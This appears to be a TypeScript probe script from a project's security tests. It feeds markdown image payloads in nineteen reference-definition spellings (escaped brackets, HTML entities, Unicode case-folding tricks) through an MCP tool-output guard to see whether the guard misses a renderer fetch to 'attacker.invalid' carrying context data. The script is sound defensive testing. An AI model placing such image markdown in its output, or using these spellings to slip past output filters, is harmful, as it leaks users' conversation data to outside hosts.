// T82 — the class T82-dup surfaced: definition-site spellings `REFERENCE_DEF`
// cannot capture, checked against the renderer this floor defends against.
//
// `REFERENCE_DEF = /^[ \t]*\[([^\]]+)\]:…/gm`. Its capture is `[^\]]+`, which is
// exactly the structural fact T81 leans on for the cost proof — and the same fact
// means a definition whose label carries a BACKSLASH-ESCAPED `]` is not captured
// at all, so `refs` is empty and the reference pass does not run.
//
// Read-only, offline, synthetic/reserved hosts only.
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { marked } from "marked";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

// Every case defines ONE label pointing at the attacker and uses it as an image.
// A case is a bypass when `marked` emits the <img> and the floor releases it.
const shapes: Record<string, string> = {
  s00Baseline: `![a]\n\n[a]: ${U}\n`,
  s01EscapedClose: `![foo\\]]\n\n[foo\\]]: ${U}\n`,
  s02EscapedCloseShort: `![x\\]]\n\n[x\\]]: ${U}\n`,
  s03EscapedCloseFull: `![alt][foo\\]]\n\n[foo\\]]: ${U}\n`,
  s04EscapedCloseCollapsed: `![foo\\]][]\n\n[foo\\]]: ${U}\n`,
  s05TwoEscapedCloses: `![a\\]b\\]c]\n\n[a\\]b\\]c]: ${U}\n`,
  s06EscapedOpen: `![foo\\[bar]\n\n[foo\\[bar]: ${U}\n`,
  s07EscapedBackslash: `![foo\\\\]\n\n[foo\\\\]: ${U}\n`,
  s08EntityClose: `![foo&#93;]\n\n[foo&#93;]: ${U}\n`,
  s09EntityAmp: `![a&amp;b]\n\n[a&amp;b]: ${U}\n`,
  s10MultilineLabel: `![a\nb]\n\n[a\nb]: ${U}\n`,
  s11UrlOnNextLine: `![a]\n\n[a]:\n  ${U}\n`,
  s12EscapedCloseInUseOnly: `![foo\\]]\n\n[foo]: ${U}\n`,
  s13SigmaUseMedial: `![οσ]\n\n[ΟΣ]: ${U}\n`,
  s14SigmaUseFinal: `![ος]\n\n[ΟΣ]: ${U}\n`,
  s15SigmaDefMedial: `![ΟΣ]\n\n[οσ]: ${U}\n`,
  s16SigmaDefFinal: `![ΟΣ]\n\n[ος]: ${U}\n`,
  s17DottedIUse: `![i̇]\n\n[İ]: ${U}\n`,
  s18DottedIDef: `![İ]\n\n[i̇]: ${U}\n`,
};

const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, text]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: text }),
  })),
};

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}

const rows: Array<Record<string, unknown>> = [];
for (const [name, text] of Object.entries(shapes)) {
  const serialized = JSON.stringify({ note: text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  const imgs = rendererImgSrcs(text);
  const rendererFetchesAttacker = imgs.some((s) => s.includes(ATT));
  const boundaries = {
    mcp: JSON.stringify(call).includes(ATT),
    persist: persisted.allowed ? persisted.content.includes(ATT) : false,
    transport: transported.text.includes(ATT),
    seam: seamText.includes(ATT),
  };
  rows.push({
    id: name,
    rendererFetches: imgs,
    rendererFetchesAttacker,
    detectorFindings: detectExfil(text, []).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    boundaries,
    leaksAtAnyBoundary: Object.values(boundaries).some(Boolean),
    verdict:
      rendererFetchesAttacker && Object.values(boundaries).some(Boolean) ? "BYPASS" : "closed",
  });
}

console.log(
  JSON.stringify(
    {
      probe: "T82-escape",
      rows,
      bypasses: rows.filter((r) => r.verdict === "BYPASS").map((r) => r.id),
    },
    null,
    2,
  ),
);
